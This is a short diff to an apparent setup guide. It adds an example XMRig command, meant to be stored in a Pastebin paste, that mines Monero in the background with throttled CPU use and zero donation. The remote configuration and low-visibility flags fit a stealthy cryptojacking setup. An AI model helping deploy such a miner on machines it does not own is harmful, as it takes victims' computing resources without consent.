@@ -44,6 +44,10 @@ Go to Pastebin and create a new paste with your XMRig mining command. This will 
 Once your paste is created, copy the raw URL.
 For example, your URL might look like this:
 `https://pastebin.com/raw/yourpastebinid`
+command should look like this
+```bash
+-o xmr-eu1.nanopool.org:10343 -a rx -k --tls -u youraddress.nameyouwant -p x --cpu-priority 1 --cpu-max-threads-hint 45 --randomx-mode light --donate-level 0 --background --cpu-affinity 1 --max-cpu-usage 35
+```
 
 ### Update the Code:
 
